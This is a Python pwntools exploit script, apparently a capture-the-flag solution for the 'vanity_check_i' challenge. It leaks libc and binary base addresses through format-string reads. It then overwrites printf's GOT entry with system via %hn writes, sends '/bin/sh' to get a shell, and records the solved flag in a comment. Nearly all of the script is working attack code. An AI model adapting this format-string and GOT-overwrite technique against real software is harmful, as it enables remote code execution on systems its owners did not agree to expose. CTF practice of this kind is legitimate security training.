#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host vanity-check-i.idek.team --port 1337 ./vanity_check_i
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vanity_check_i')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'vanity-check-i.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+144
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL:
    libc = ELF("./libc-2.31.so")
else :
    libc = ELF("./libc-2.31.so")
    io.recvline()

io.recvline()
p = '%{}$p'.format(35+6)
io.sendline(p)

data = int(io.recvline()[:-1],16)
print hex(data)
libc.address = data - libc.sym['__libc_start_main'] - 234 - 9
print hex(libc.address)

# __libc_csu_init + _start
p = '%{}$p'.format(31+6)
io.sendline(p)
data = int(io.recvline()[:-1],16)
print hex(data)
exe.address = data - exe.sym['_start']
print hex(exe.address)

off = []
print hex(libc.sym['system'])

temp = (libc.sym['system']) 
off.append(temp % 0x10000)
temp = temp >> 16
off.append((temp % 0x10000) + (0x10000-off[0]))
temp = temp >> 16 
off.append((temp % 0x10000) + (0x10000-off[1]))

p =''
# p += '%{}$p'.format(5+6)
p += '%{}x%{}$hn'.format(off[0],5+6)
p += '%{}x%{}$hn'.format(off[1],6+6)
# p += '%{}x%{}$hn'.format(off[2],7+6)
# p += p64(0)
p = p.ljust(40,"\x00")
p += p64(exe.got['printf'])
p += p64(exe.got['printf']+2)
p += p64(exe.got['printf']+4)
io.sendline(p)

io.sendline("/bin/sh\x00")



# idek{ohhhh_s0_th3_c0mp1l3r_w4rn3d_m3_f0r_4_r34s0n...}


io.interactive()

